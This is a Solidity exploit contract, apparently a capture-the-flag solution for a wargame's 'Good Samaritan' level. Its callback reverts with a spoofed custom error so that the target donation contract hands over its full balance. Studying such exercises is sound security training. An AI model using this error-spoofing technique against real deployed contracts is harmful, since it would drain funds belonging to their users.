// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface ISamaritan{
    function requestDonation() external returns(bool enoughBalance);
}
contract GoodSamaritanAttack {

    ISamaritan public target;
    bool public enoughBalance;
    error NotEnoughBalance();
    
    constructor(address _target) {
        target=ISamaritan(_target);
    }
    function attack() public {
        enoughBalance = target.requestDonation();
    }

    function notify(uint256 amount) public{
        if(amount <=10){
            revert NotEnoughBalance();
        }
    }

}
